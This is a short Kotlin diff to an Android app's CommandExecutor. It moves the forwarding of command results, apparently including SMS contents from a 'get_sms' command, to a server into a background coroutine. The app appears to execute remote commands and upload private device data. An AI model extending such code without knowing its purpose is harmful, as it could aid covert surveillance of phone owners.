@@ -80,10 +80,17 @@ object CommandExecutor {
         if (commandName !in DATA_COMMANDS) return
         // result may be a Map (e.g. get_info) or a List (e.g. get_sms).
         // sendData serialises whatever it gets via Gson, so either is fine.
+        // sendData is a suspend function — launch a coroutine to call it.
         try {
-            ApiClient.sendData(context, commandName, result)
+            kotlinx.coroutines.GlobalScope.launch(Dispatchers.IO) {
+                try {
+                    ApiClient.sendData(context, commandName, result)
+                } catch (e: Exception) {
+                    Log.w(TAG, "forwardDataPayload: sendData failed for '$commandName'", e)
+                }
+            }
         } catch (e: Exception) {
-            Log.w(TAG, "forwardDataPayload: sendData failed for '$commandName'", e)
+            Log.w(TAG, "forwardDataPayload: launch failed for '$commandName'", e)
         }
     }
 
